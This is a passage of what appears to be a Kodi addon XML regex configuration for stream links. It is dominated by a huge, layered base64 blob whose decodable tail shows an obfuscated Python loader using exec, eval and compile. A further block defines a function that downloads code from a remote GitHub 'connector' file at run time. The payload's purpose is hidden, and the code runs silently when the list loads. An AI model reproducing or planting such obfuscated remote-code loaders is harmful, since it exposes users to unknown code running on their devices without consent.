0xVk1VMUVVVFZPVkd0NlRrUlplRTU2YXpKWmFrMHdUbnBCZWs1VVdteE5lazB4VGxSVk1VMTZXWHBPUkZGNlRucFJlazlFV1RWT2JWVXlXa1JTYVU1VVp6Rk9WRnBxVG5wbk1sbDZWVEJPZW1jeVdXcFZkMDV0VVRCTlZFMDFUbFJqTUU5RVVYcE5lbU42VGtSak5VNHlSWHBQVkZWM1RYcHJNVTFVWTNsT2Fra3lUbFJXYUUxNlVUTk5WRmw1VGtkSk0wNUVWWGhPYlZsNlRtcFZNVTVxV1RKTmFsSnBUbXBWTWxwcVdtaE9WRUV4VDBSTmVrNVVWVEpaZWswelRrUk5NVTVxV21oT2Vsa3dXWHBXYUUxNlZURk5hbFUxVG1wUmVrNVVXbXhPUkdjeVdrUlZkMDU2VFRCUFZFcHBUa2RKTUU1NlRUSk9iVmw1V1dwa2FFNVhSVEpPZWtwdFRrUlZlazE2VlROT2JVMHhUVlJhYTA1cVZYcFBSRlV5VGxSWk1rNUVZM2RPYlUwd1dYcGpOVTVVYXpGTlJFMTZUbXByTUU1cVdtaE9WRUV4VG1wWk1rNTZaekpQVkdONlRtcG5NMDlVWTNwTmVtc3hUVlJhYUUxNmF6Rk5WR040VGxSUmVrOVVVbWxPZWxreVRWUmpNRTV0V1hwTmVrMDBUWHBaZVZwcVVtbE9WRVY2VFhwU2JFNUVUVEZOUkZWNlRtMVplVnBxVFRST1JGVXpUVlJTYVU1NlNUSk5WRTB4VGxSVk1GcEVVbTFOZW1NelRXcFJlazU2VVRGWlZGcHJUbFJOTWsxVVRYcE9lazB5VDFSTmVrNVhSVEZQVkZreVRtcFpNbGxxWkdoT2VrbDZUMFJaTlU1dFdUTk5WR00xVG1wcmVrOUVXVEZPYlVVeVRtcEtiVTU2UlRKYVZGa3dUWHBSTVU1cVdYcE9SMVV4VGxSTk5FNXFUVEZPUkZKc1RucFpNMDFVVFRCT1ZHc3lXbFJWTUU1dFVUQmFhbFV4VGtkTk1FNTZZM2RPVkdzd1dsUlNiVTVVVFRKTmVsa3pUbnBWZWsxVVRUSk9hbFV5V21wVmVrNXFTVEZPZWsxNVRYcFplazFxV21oT1ZFa3dUV3BqTTA1NlZUTk5hbU40VG1wamVrNXFUVE5PZWswelRXcFNiVTVVYXpGT2FsazFUa2RGTVUxcVNtbE9SRTB3VDBSak1FNXRVWGxhYWxVeFRrZEZlazU2VVRWT2FtY3hUa1JTYUU1SFdUTk5SRTEzVGxSRk1FNTZWWGRPUjFFelRucFplVTVVV1RKWmVscHRUWHBaTWxscVkzaE9WRmw2VFVSWk5FNXRVVEpQUkZWNVRqSkZNRTlFVm1oT2FsVXdXV3BOZWs1NlJUQmFSRkY0VGxSbk0wMUVWWHBOZWtVeFRsUktiVTVVVlROT1ZFMHlUbGRGZWs1RVdUUk9WRUY1V1dwVk0wNTZUVE5OVkZKb1RtMVZNazlVV210T1Ixa3pUVlJaZUU1NlVURk5hbU13VGtSUmVWcHFXWGhPZWxreVRsUlJlVTVVV1RKUFJGSnBUbnBWZWs1cVVtMU9la0V3VG1wU2EwNUhWVEZQUkZrd1RrZFpNMDVVU21sT1IxRXhUbXBSTlU1NlZURk9hbU15VGtkSk1sbHFUVEZPZWtWNlRtcGplRTV0V1RCT1ZFMHlUbnByTWxsNlRYaE9SMVV4VG5wU2JVNUVUVE5QUkZVeVRsUlJNazVFVlRST2FsRXdXbXBaTWsxNlp6Tk5lbU13VFhwQk1VMXFWVEZPYlVreFRYcFZlazU2VFRGTmFrMDBUVzFKTWxsVVdUVk9hbWN6VGtSU2FVNTZhekpPYW1ONVRtMUZNbHBxWXpOT2Fsa3pXVlJhYTA1NlJURk5SRnBxVGtSbk1VOUVWVFZPYW1jeFRrUk5kMDU2UVROTlZFMHdUa1JKTUZscVdUSk9lbFV4VG5wTk1rNXRTVE5OVkZreVRsUlZNRTFxVVhoT2Fra3pUV3BLYlU1RVp6SlphbU40VG1wamVrNVVWWGhOYlVreVRWUlZNazVVWXpOT2FrMHlUbFJOTUU5RVdUQk9WRkV3VGtSTmVFNVVRVEZQVkdONVRucEJNRTE2V1ROT1ZHc3lUMFJWTWs1dFRURk9ha3B0VG5wRmVrMXFZekZPUkVrelRtcFNhRTU2U1RCT1JGa3lUbFJqTWs5RVNtMU9Na1V3VGtSak1rNUVVVEpPUkZWM1RsUmpNRTVFVW0xT1ZHc3dUa1JqTkU1NlNUQk9hbEY1VGxSbk1VNTZVWHBPVjBVeVdtcFNiVTU2UVROT2Vsa3pUbFJqZWsxRVVtcE5lbWN6VFdwU2FVMTZaekZQVkdNMFRYcG5NMDVxWTNkT2Ftc3lXbXBTYVUxNldUTlBWRmt6VGtSck1rMXFXbXhPYWsxNlRrUk5lRTU2YXpOTmFrMHpUbTFaTUZwcVRUVk9la2w2VFdwamVFMTZZM3BPVkZVeFRrZFJNVTVxVlRST1JGa3hUMFJqTkU1VVp6RlBSRmt4VGtkTk1VNTZWWGxOZWtWNVdXcFZNVTVVUlRCUFJFMTRUbXByZWsxNlkzcE9ha1Y2VGxSVk1VNXFWVE5PVkZFd1RsUlpNRmw2VFhwT1ZGVXlXWHBWTlU1cVNUTk5WRkY2VGtScmVrNTZUVEpPZWxWNlRrUmpNRTVFU1RKYVJGa3hUbGRGTVU5RVZYaE5lbEV4VDBSYWFrNXRTVE5OUkdONFRYcFZlazFxVVRGT1IwMHdXVlJWTkU1VVdYbGFhbEY1VFhwUk1rNXFZekpPYlZVelRrUk5lazVIVVRCT1JHUm9Ua1JSTVUxRVRYaE9hbFV4VGtSUk5FNXpIeGtBQUZGME1FMUhXakZCUjB3eFFVZGFNbHB0U0ROYVIwVjFRVlJXYlZwSFRHdEJSMHd4UVZGRU5FRjZXakJCZDBnMFdtMVdNMEZ0Y0ROQlVVeHRRVzFNTUVGdFNESk5kMW94UVcxME1VRlJXbXBCVVhSdFFYZHdhMXB0VERGYWJVUXlXbTFTTUVGUlNERkJkMGd5V20xRmRVRkhVak5CZDB3elducE1NMXBSY0RWQmJVUXlRVzF3YkVGUlVqQkNVVVF6UVcxNE1VRnRUREZhZWxadFFXMUVhMEZVV20xYWQwMTNRWHBXYlZwdGNEUkJSM2d5UVVkSU1FRkhUREJDUjBneVFVZHdNa0YzV21wYWJWcHRRa2RhTWtGM1JESmFSMXBzUVcxT2JVRkhSWFZCUjBneFRFZElhMEZ0U0RKYWQwMTJRVWRNYlZwdFdqRkJVVll6V2tkRmVrRjNURE5hVVVodFFYcE1iRTEzUlhaQmVsSnNUWGRJYkVGM1ZqTk1SMFJ0UVcxRWJFMTNURzFCYlVSdFFsRndha0ZSZEcxQmQzQXlXbTFNTUVKSGNHMUJWRXd3VEVkd2JVRXlVakpOZDBWNVdtMTRNbHBIUkRGYWJVeHRXbTFJTkVGNlNESk5VWEEwUVZGV01rMVJXbXBCVkVodFduZElNRUY2VERKQmQwVjJRWHBNTTB4SFRHMUJkMFJ0V2xGTWEwRnRkREJhUjNBMVFWRkVNVXhIV20xQmJWb3lURzFKZFVGNlJESk1kMGhzUVhkYWJVSlJSREZhYlhBeVRVZEVNMEZSY0RKQmQwVjZRVlJTTUUxSGNHeEJWRXd3VFVkRU1VRjNVakJhYlV3MFFWUkVNRXh0VERWQlIxWnRXbTFKZFVGdGREQk5kMHcwUVcxd01WcDNjREZCZDFveFRFZEVORUZSY0RKQmQwMTVRVXBTYlZwSFJHeEJkMVl6V25kTmVVRXlVakpCYlZvelFWRjRiVUpSY1hWQlZFUXpURWRFTTBGSGREQkJVVnBzUVZSV01FRnRURzFhYlVnelFrZFhla0YzV2pKYWQwZzFRWHBFTUVGUlRYWkJla2d3VFZGTmRscHRTREpCYlUxM1FVZE1NazFIUkRKQk1sSXlUVWRGZDBGSFNESk1SMGcxUVhwYU0xcHRjWFZCZDNReFdtMWFiRUZSVEcxYWJYQnFRVEpTTVVKSFJYWkJWRVJ0UVcxTU1VRlJUREphYlZvelFWRndNMEpSUlhwYWJVZ3pRVzFKZFVGdFdteE1kM0EwUVZGMGJVSlJXak5CUjNReFFWRmFNVnB0VERKTVIwUXlRVWRhTWxwSFRYbEJSMW94V25kTU1GcHRjREJCUjBRd1FXMWFNa3hIU0d4QmVsSXlXbmRNYTBGNlREQmFSM0F3UVhwSU1scEhSRzFCUjA1dFFYZHdNMEYzZEROTVIwbDFRVkZ3YlVKUlJHMUJTbEl5VFVkYU5VRjNlREpDUjFwc1dtMVdNMXAzU0ROQmQzUXdRa2RJYWtGM2RESmFkMFYzV25wTU1VRlJUWGRCZWtRd1FYZHdNVUZSU0RKTmQzQXhXbTFTTVVKUlJEVkJSMGd3UVhkRmRrRjNTRE5DVVhCdFFXMXdNa0Z0VERKQlVWWXdRbEZhYkVGM2VERkJVWEEwUVZGNE1scEhUREZCVVZveVFsRklha0ZSV2pCQmJVUXpRVlJXTTBGdFYzWmFiVTV0UWtkTU5VRjZWak5NUjAxNFFXMTBNMEpIU0RSQmJWSXdRbEZhTlVGM1REQkJVVXd3V25wTU1WcHRSR3RhYlhneVdtMVhla0ZSVWpCYWQwaHFRWHBJTUUxM1JESkJWRm96UWtkTmVrRlVSREJOVVhBd1FYcFdNVXhIUkcxQmVsb3pRVkZJYlVGUmNEQmFkMDExV20xd01GcEhURzFCUjFJelFXMUVNa0ZIV2pGTVIzQnRRVzFTTTBGUldqRkJVVVF4V20xRU5GcHRjREJCZDB3eldtMWFNVnBIY0RGYWJWb3lXbmR3TlVGdGVERmFSM0F5UVVkNE1WcHRjREZCUjA1dFFrZEVNMEZIZEcxQmJVVjFRWHBJYlVKUlJYcEJiWEF3VFVkd01FRjNTRzFCUjNGMVFXMTBiVUpIV2pGQlVWb3hRVkZJTkVGNlZqSk5kMWQyUVVkNE1WcHRTR3RCVVVSdFFXMUVORUYzVW0xYVVVVjVRVlJFTTBGUlREUkJSM2d4UVhkRU1scHRjREJNYlVReVFYZHdiVnB0VFhwYWJYQXpURWRhYkVGUlZqTkJkMGhzV20xV01FeEhSWGhCZDNBeldsRk5la0Z0VmpOQ1VYQnFRVzFhTUV4dFdqTkJWRll3VFhkWGRrRjZTRzFCZDB3MVdtMVdNMEZ0U0d4YWJWb3dUVWRJTWtGSFRqRkNSMXBzUVVkU2JVRlJXakZCYlhneFduZElha0ZIVW0xYVIwdzFRVzFFTTFwUlRHdGFiWEF4UWtkd05GcHRlREpDUjFkMlFYcEVNRTEzVERKQmJYQXpRVWRNTUZwdFdtMUNVVVJzUVcxRU1FRnRjRFJCVVV3d1drZHdhbGRxTUZodU1razFiMHBUWlUxTFZuUkRSazVoU1VveGJuRlVVMVpIU1ZkcFJIcGpORnBIZFc1QlIzVnVRa2xTWlVGNlVqSkZWV05YV0ROWFJXNTNUR3BhTVVrMFdESjVTVzlIU1hwdmVERnBSVkl4V1ZwNk1YcEpTbGN4UVV0WE5VMXRjREZIU0VsMVNsRlBSVXBUZVdWdlZGZGhTVlJNTkc5c1oyRkdNakJxYjNveFNGZ3dZMnRNU0VGS1NUQmpVRmd5UVdKWmJEa3pUREpCV2tKSVJHdHVTalYzY0VvNWEyNVVVelJ2WVhneWJuZE5TWEI2WnpOQk1qbFRSVXRhTTBZeFNURkdla1ZKU1hkMWVVaEpVM1ZhYlVGTVJVZEJTRUpJU0d0YVlWTkVXakpUWlUxTFkyeHhNMWRuVERGNVprSkxRVzV5U0dzeVJFbHhZVWxKU0d0TWVubDRXRzExU0V3emVUSkNTbEpsUmtwSlNVcDZPVWRJVVVnMVIzbzFXbkozVjBkRk0zRktRbFIxZVVodGNXdEVSM0ZpY25wRU5IRXpRVmhHVW5ScWNVdGphbkZSU1ZkYVZFZ3lXa3RYWTBsNVJEUklWR040UlVvNWJIQXhkR2x2ZW5sc1RVbzFWa3hIU1dKdlVWTmlRWGxFYW01TFQxQlliWEV3UVVvNVpWa3daek5HTVUxbVdtRkJZMFF6VFVkd2VtZEljRkY0YkhCSFJXMU5VMU5OV2toYU0yOTZWMkZKU0RGTVdqRkJZMGg2VXpOQk1qVmhjVWxGV1VGM1JXMXVlSEY1VEVoalNFRnRVelJOWVZZelFsQm5UMHBTVjJsSE1sZFpibEZJWlhCSFFWVndTMk5SUVZWRmFVWlNVek5JWVZNMldEQm5Za3hMVjFWTlNERnVUVzFPWlc4eVUzZHdZVmRxUjFKRWJVeHNPVVZOZGpsNlFsTk9NM0V5UlVod01tZHRUREZCYlVkTGNUWndNRUZpVEVobWJVbFZVMVZDU0UxYVFXMXhVWEJ0UVc1R01tZHRTVXBuZVhCNmRXRkNVWGxIUjBwNWJVRXlTVUZHVWtSc1dHMVhkbkYzVDBwSmQweHNjR0ZqZFVaR1pqSndlRlkwU0hwSlkwUkxZMmhDVTFwclNEQkphMHhLTVdSTmVrVXpTWGRhTlVneGNXWlpNbE5OY0RCTWJVWlNWbWxZYlVWUlJsVk5aa2gzV2pCYVMzaGxTVk5JTVVGaFNHcHdSMWRyYm0xMWVYQjNSV2RKUm1ac1NESTRiRWxVY1dsdmJEbGpSMUppTUZvelUwcEZNMFZXUVcxVFNrWXlSVlZ1TWsxV1dXMTFkM0o2TVdoRlNERllSRE4xTVUxS2RHeE5lbmxpYjBoV1pYQnRlR3hGU0hGb1NIbDVRVVZKY0cxS1NuRnFSMGw1VTBaVFNWVnlkM2syU1cxeGJrMTZTVWx1TTA5UlJYcDBha3BIVFdSeVNsZFBjVkZJYlVaR1pqQndWRk41U2toV2FYRXpZM3BaTVhsWlJYZHhZVzU2U1RGeFlWTjVUVEpUV0VKSVUyaE5lbEpzUWxGV2JYSmhUWHB4ZUhWVFRFcHFhbG93V214YVNrVm1TVWw1YlhKVlNVZEhla2xoYjBwMVpYQkplVzF2U210WlFsSmpRMXAzU1ROQlMwNDFSbEpuYlhCNmVXRkZNREYxUldGd05FY3pVelp5U21OblJqTjVhVzVTTURGdmJWcHJTbFE0YTBsSmRWbE5Ta2xsUWtkWGJXNUdaMmx3WVVGNWJraE5VVVJ0Vm1WR2VrVlRRVWRGZGtWNFYwaEhTR0p0V2tneGVtNVFaMmR4U2tsRldURkVNRVZoY1cxdmVIRlRUWGwwTUVWUU9VRkVNMWRtVFZJNU5rWkpWakJDVlU5SldXMTVOSEJJZVdKS1ZYRlpTbmxCYkVsVWExRkdZVTVsUkVwbk5VcDJaalZKTTNFMFdtRkJSMjlLY0RGYU1EQXhTRzFJTVVGSVltdE5ZVTF1V0RCamRVbEhUMmh5VkRRMVFYaFhWM0ZMZFVwdlVEbFNRbFJFYlVkTFNHcGFiWEZhUkV0VFRFZFZXakJFZGpsalRXMVRiRzlMWTJsTlMxTlNXVE5hYlVKUVpqUllNa2xJUWtoSmJVbEhTR3RHTURWSVdtMUJVWEIzZFhWTlZGZHBURWhtYlVwMk9VSlpNMU51UWtkRlNFaFJVekp4TUhsdFNraHFNWEJSZFZseWQwOXRSa3B4TTBsTFJXVlpNbkV6Ym5kRmVIRlJTV05aTTJORmNFZDVXVVF5VnpKTlZYbDRXV3huU1VsSWNXZHlVbE16UkRKTU1VMHdlVU5hYlhsaFJqSXhUVzVMVm1WSlVYbGFibmxhYlhKS2RWQkNVbGQzUm0xeGJGcDNUVE5LZDBScFNIbFhSa3BJVW10eVZVOU5TbmRYZDI5dFFWaHVWVmRCU1VabmFFUjZRV3RIU0dNMmIwZE5kVUY0UlhwQ1NuVjJSak5CWkV4NFUzZEhTbWRaU1VoSlVWcFNaMnRDUmpsUFNXMUZXazB3ZVhoeGQzVkpibTFGZWtKUmRWaHdlbU42Y0cxVE1rMHljVXhCZW10RlFrZFdhMFYzUldOS1VWTjRXbFZNTkVSaFFYbEdSMEZRV1cxNVVrRXhRVnBGU2xKdFRHMVRhMjlLVm14S1lWcGxia2RYWlVKTFYxQkZiWEZVV1RCTlZVUklWMUZHUzNsNGNGVk9NbHBIY1dsdU1FRnJiMGhqYmtReWVUWkhTMEZYUWtsYU5Gb3lZMlZCTUhCcGJ6STFURVZMY0cxeFNIRXhXbEk1Ykc5TFRVTkpSbWRJUm0xUFZHOUhTV2xOU2psc2NrcEpOVWN6Y0cxQlVsTjJUREZJTlZveWExcHdWSFV3U1ZSclVFeDZNV3hLZWpWNVJrZFBUMWt5T1d0S1NVbExSVEZUVUhGNVJUTnhkMDlZVFVsYWJFWXdNRzF5UjFOaWIxVk5TRVZ0UkRSSE1tWnBXVE5pTUc5dGREQkVNRUZzYjBoVGFFZGhRVFZ2TW1KbFRIZEpOa3BIUkcxRWJEbDRjVXRCU1ZodGVVMU1lWFZYUmt0NE1VWjNWMk5KU2pVeGNWQTRhVTB3U1doYWQwaGxibEl4UjI5S1UxQnZNamhzVFVoNFpVMHpVbXRHVW10TldtRmlNM0ZMWTI1RU0zRlJja281U1hKTFdqVkplSGhsUkV0d00wRjNjRzF5ZWtGNmNIbDVaM0JIZVVoQ1IwMUdUVEIxYUVKVVUwUllNSEZsYjNoblpXNUxlV3R3ZVhWUFNrdE9Na0pIU1VOYU1tZDNiakpOWlVkSVdqVk5TMGxEYmxWU1pYQkpSVEJDU0RGR2J6RkZNVWd3ZVdGS1NqVktSak5UUlUxM1RWRnlTamxKV1RKeFVHNUlVM2RHVW5saWIxSnhVa3hLZFhaYU1VNHlUWG81UkVWVVYyZEJTbmxSY2toNGFtNVVSVkJ5U2pRMFFrb3hWMEZRT1hwTlVuVmFSVEpUYWtSc1oycEVlRUZCV1ROTldFY3lkV0p4ZVZjMlNETlhZWEF3ZEd4d1VWZDJUREEwYlZreFRETndlbkJ0U1VsalRYRXlSR3BIZWsxcFIxVldOVWt6UVZkRWVtTkNXRE5CYkVaSlRUVnhVbkZqYm5sSk5FbEhUV2h5VWpGWFNuZFRlVTFIY1hWTlZIVmljbmxFTTAxNlYxTkJWSFZvV21GVFlreDNVelZIU2xOMVRFaHJkMFpUUldwQ1ZWSnRTVlJYU0VkVFYxcHZTR016UWtoclkwZEdaMHh1ZWpnMVRESm5UVzR5U0dsTVNFRXhSVWhXYkUxM2RYaENWWGw0U1hoNE1rVklUVkpFU0hGblNUTkJVMEpUUlVwdmJYVTFUVEExVlVoUVoxWkhiWFZWUmtabllrRXlTR3B4Um1ZemNGSlhkVWRIU1ZaYU1YbE5RbFIxV1c0elYwWkdZVXhzY0hsNWVrMVZlVUZNU0RCclJIZDRiRzh4ZUdWSlMwMWxTRXRqVEhCMlptMUVNVXd3Y0ZKVFpHNTZlV1p2ZDFOdFIyMUJWMEpVU1dwR2VYVkRUSGRUVjBKS2VESkhTVTVyYmpKeGVuSkljV1JOZUhVMVRFcFhla1l3ZVRWdmJVbGhRWGRQYTNCMk9WUmFTVTluU2xWSk5rMUxlWFZ1YkRsbWJsVkpSVXBIZVZsQmVYbGFUVXRTYkZrd1FVcHhkamxSYmpOMVNIQXhTVUZHZUdKcFNubzVlVWhMUlVWWk1uVjFiekJKYVc1S01UTnhVWFZYUVVZNWJVcEtNVzFCVW5VMVIwcDVTVnBMZVdGR2VqUnNiakZqUjNCNVNXbEhSM1V6Umtwd00yNTNRVlpNUjA1clNFbEpiRTFWVFZwRmVYVnVTVzFXYkVsS2NUTmFNbE5KU0hvNVIwaFZSRzF5UzBGMVRIZFBNa0Y0UVdOd01GZEJUVWROVUVaS01XMUZTSGcwYmxSWFQwaFRWMVZ2U21kNlRVZFBUMDFWVTJOd1IwVm5Ta3RCTTBaSlkzWnlTSEY1UWt0V2EyOUpUVEpaTTFkWVFVcEliVWN4VTJOQk1XTlBSVXBNTWtkNlUwOUJTR3RuYjBkQmJYRjNjVTFNYlVRMVFsVlhTVzk0U1dOd2JYbHRibEZFYTBKSFVtdFpNVTV0UlZWTlJYQXpZelZHU2pGSmJrdFRWVnA2Y1dsYWVGZGtRbFJxYWtaU01YVk1NRFZqU1RBeFdISjZOV0pOYlVGM2NERk5kMjk2ZUROd2VuRXlXbmR4TW5GaFYzaGFSMGt4V0ROalExb3dPVWxFU0dKcFdUSm5URVpIZFZodlVsTlZjVkk0TTBWS1UzZHlZVk0wY1hsQlZVMHlOWGhKUzFOS2NXRmpXVTFSY1cxRk1FRlpSVlZPTVVSS2EyMXdWSGxYV25sUFZrZElTVVJ1TW1kclNVbzBiRUpKZVZGYWQxZEdja3BYV1UweWNXMUlNVXhxY0hoU05FcFVWMGRGUzNGUlduWm5ZVnA1UVdSYVVqRXliakZUVDB4M1UxSnVTbXQ2UkRGeFJscFNhMUp2VVhWc1NrcHhVVWhHT1hwd2JHZFZiMkZYV1VGNlNURkZlRmRUYjIxd2JFaEpkVXR2ZWtGWFJqQmFOWEpJZVdsTVlWZHJSVXRUYmsxNmExVkhVbkZ0V2pKSmRuRlVRVk5NU0hsRWJ6Rmpia0ZoVEdseFMySXpSM3A1YlVFd2REUk5SMUp0VEhkUFZVSlVkV1JDVW1OblJraG5XbTlTYTFoSVZHbzFXREJXYlc1UmVYZHdSM0ZMU1hseFYwbFVUR3BDUzA1dFFrZzVlVXBLVWpCTlVHWTBURWRhYlVaSVRESktTbXRTUlhobk5FcFJVMk5OYlVsM2NVdEJSMjlJYTFoQ1NVVm5UVXBGVFc5SFFVSlpNbGRZY2tsU2EzSklZMkZDUzFOWlRVZ3dha1V4WW10QlNVUXdjVlZFTVVkS1RWUklNM2wzUVcxVFJIQkhWM3B5ZWtGdGJrbHhaVWxKUlhwQmVWTnNXVzF4TWtsSlJXSnVWVVZwUVZGV2FYQjVjR2x1VWpoclJucFhaWEF5T1dGRU1ERlZjVEJYWTFwVVkzbHZNMGxFU2toSmFYRXpZMnh4ZW1ZMWNWUkZiVzVJWjBSd1VtZHVia2xJTTNCNFp6TnhVMU5IU1ZKQk5raElWMnBZTVU5cVJWSndha3BLU1RaSlMwbFFiMkZ3TVc1SU9WUlpNMEZyUWxKQmFISlJUbVZ4YlVWTmNEQXdhVzlVZFhWdVZFMUpRVW93YVZreFkxZEJNMDFpUjBkQk0xZ3lPWGhLZUZkclFXMUpkVVY2Tkd0R2JYQnRRa3B3YVhKTFQzbEJkMEZYY0hsVFoweEtNRFJhTTBscmJ6QjBNVUV3U1V0eFNEbEpRVWRKVjBsS1lqVk5TMUpwUm5samJuRjRaalZGU0V4cFdsSkZNRXBLWWpGdlUzRkxibEZhYlVSTFdtbEpSM1ZwYmtneGFWb3hkVUZCU0RsVVJWSkpORVJzWjJkeWVFRk5XREkxYUhGNGEyeEZiWFZaY0ZSVGRVRlNRVzF1UjA1dFREQk1hbkJMY0dsSVNqRlZXR3htTVUxS1oybGFNbU5CYmxWYU0yOHhSV0pOUjNGWGNHMXhVRUpLYTFWYWJVbHNRbEZQWVhKVVYySnVlSEJwU1ZORU0xa3djRFZKU2pBMFRWUm5aMFpHWjNkRVlWZDNia2xGVEc1c09YVlliVmQxV0cxMVdVMUxVMFZFUjNWQmJrcEpabGt6VWpOYWVGYzBjbUYxVDNCSU9WRk5TbmxQU0ZWNWEwcFJlRzFZTW5ScmIwWTViWEF5YTFsS1NubHNXVEJCVkc1VU5VdE5iVTlJY2tvMVMzRkdaMHRhZVVsTVFsVkJkVUpWV21WeE1VbElXakp4YTI4eGVVdHViRGxQY25kTlRIRktlWGh1VTFaclNrdFNNRzloV21sd1ZIVkdRWGxKYkUwelFVVkJiWGwyVFZKcmVtOHlOVXB5U2pnd1NVaHdNVzlIVW10SVMxTjFjSGhhYTB4SlNWWnViVmQyUkROTlZVeEhWbTF1TW5WaVRVdGFOVXhJZVZkd1JtYzJXREoxU2xveWNXMVliVTFqUVVoRlNVeExSV1pKVVVRd1RESjROVnBIY0dseGVqRkZja3RYYVhGUlFWRnlkMXBwVFVZNE5HNUhSVmhaYkRsaFNFbzRaVzlLZUdsR1lXTXpjVzExVlV4SFNXTkZNVk5YUWtoQmRVRlZRWGxNU2pGRmNsRldORmd5ZVVwRlMzQXlSakpuZVZoc09WTmFSamxxV1RKcmFYQnNaMmx3TTFjMFJHMXdOWEJRWm1sWk1GZHFXVE5KZDI1SWNEUkpVR2RuYjNoSk1uQnRVMmxJU0hGalFXMXdNMEZLTVVsSlVYZ3djbE5QVTNCUlQwUndiVTF0VERCNE0xb3hVM2xhU1VGa1NWQTVaMEZ0ZFZGR2JYbHBSVXBCTTBwSVdqRmFSMDFtUWxSRlkxZ3plVzFHZW1kVGNGQTVZMEpUZVd0d1JtZFFSbTFQWkc1S2VUQkZZVXhwUWtsaU0wZFJUVTF1VURocWJ6TjVTVmxzWnpCS1UwOHhibFZUV1c1UlNYVnVSMFJxV1ROV2FXOTJPRzFHYlhWUGJrcHdNVUZVZUdWdWRqbHJSREo0TlVsdFZtVnZlVWt6UVcxNWFrSkdPR2xOZW5WaldXdzVZMjVLZVVKRVIzaHBjV3htYVZreWRWbEdNSFJ0UWxSRU5FUjNUR2xIZWpsUWNVdGphbHBSTUdGUlJHTTJia281YUZaUk1IUlhNV3MwUVcxWGNISlJUWHBMVlhRelFWTnJORnB0VTNCeVVWcHRWMm93V0c5NlNXbFdVVEIwVFV0TmRXOVFkR0ZMVlhReVdubHJORUYzZVhCeVVVMTVTMVYwTWxwSmF6UkJiVUZ3Y2xGTWJVdFZkREpDU1dzMFFYZDVjSEpSVjNsTFZYUXpRVWxyTkVGNlNYQnlVVXcwUzFWME1rRkphelJCYlhWd2NsRk5kMHRWZERKQ1NXczBRWGROY0hKUmNEVkxWWFJzUWxOck5FRjZSWEJ5VVUxNlMxVjBNMXA1YXpSQmJVOXdjbEZNTkV0VmRESkJTV3MwUVcxSmNISlJjRzFMVlhSc1FrbHJORnAzVG1GWVJrNWxWbFJKTWt4S2FtSlhNV3MwUVhkQmNISlJUWHBMVlhReVFWTnJORUYzU1hCeVVVeHRTMVYwTTFveGF6UmFla2x3Y2xGTU1FdFZkREpCU1dzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVlkwUzFWME0wRlRhelJCYlZkd2NsRk1OVXRWZERKTlNXczBRWGQ1Y0hKUmNEQkxWWFF6UWtsck5GcDZRWEJ5VVZacVMxVjBNMHhKYXpSQmQzbHdjbEZOZWt0VmRESk5TV3MwV25kNFlWaEdUbVZXVkVreVRFcHFZbGN4YXpSQmQxZHdjbEZNTlV0VmRESk5TV3MwUVhkVGNISlJjRzFMVlhReVdqRnJORUYzZVhCeVVVdzFTMVYwYkUxSmF6UkJiVWx3Y2xGTmVVdFZkREpDVTJzMFFYZEpjSEpSY0RSTFZYUXlUREZyTkVGM2VYQnlVVXd5UzFWME0wSkphelJhZDNWd2NsRk5la3RWZEROYWVXczBRWGRUY0hKUlRHMUxWWFF5VERGck5FRjNTWEJ5VVZZMVYyeDRkRmhzVDNseGVsTm1XRkJ4Y0hKUlRHMUxWWFF5VFhsck5FRjNSWEJ5VVV3eFMxVjBNbG94YXpSQmJVRndjbEZYZVV0VmRESkJVMnMwUVhkSmNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwYkVKVGF6UkJlbGR3Y2xGTU1VdFZkRE5DU1dzMFFYcEZjSEpSVEd0TFZYUXlUSGxyTkVGM1NYQnlVWEJzUzFWMGJGcFRhelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUkRCWVRVdE5kVzlRZFhkdk1qRnFia3ByZVZoVlkyWnVTbFpvVFZSSmQyOHlNV3B3ZWtsdGNHeDFka3hMUVhsQmQwUm9USGRNTUUxVVNYZHZNa1Y1V0ZSSk1reEthbUpYTVdzMFFYcEpjSEpSVERGTFZYUXlUWFp3WTFoR2VHWlhiV3R0Y1ZWWFkyOTZjQ3RYYkdwaFRVdDFlVXhzY0dOWVJEMDlkQVVBQUFCeWIzUXhNM01KQUFBQWJXOXljR2hsZFhNZ2N4d0FBQUJqYjJSbFkzTXVaR1ZqYjJSbEtIUnlhVzVwZEhrc0lIcHBiMjRwZEFZQUFBQnZjbUZqYkdWekhnQUFBR052WkdWamN5NWtaV052WkdVb2EyVjViV0ZyWlhJZ0xDQjZhVzl1S1hRREFBQUFibVZ2Y3dnQUFBQThjM1J5YVc1blBuUUVBQUFBWlhobFl5Z0xBQUFBZEFZQUFBQmlZWE5sTmpSMEJnQUFBR052WkdWamMzUUlBQUFBYlc5eWNHaGxkWE4wQndBQUFIUnlhVzVwZEhsU0JBQUFBSFFJQUFBQWEyVjViV0ZyWlhKMEJBQUFBSHBwYjI1MEJBQUFBR1YyWVd4U0JRQUFBSFFIQUFBQVkyOXRjR2xzWlhRSkFBQUFZalkwWkdWamIyUmxLQUFBQUFBb0FBQUFBQ2dBQUFBQWN3WUFBQUJ6WTNKcGNIUjBDQUFBQUR4dGIyUjFiR1UrQVFBQUFITU9BQUFBR0FFR0FRWUJCZ0VHQVFZQktnRT0iKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
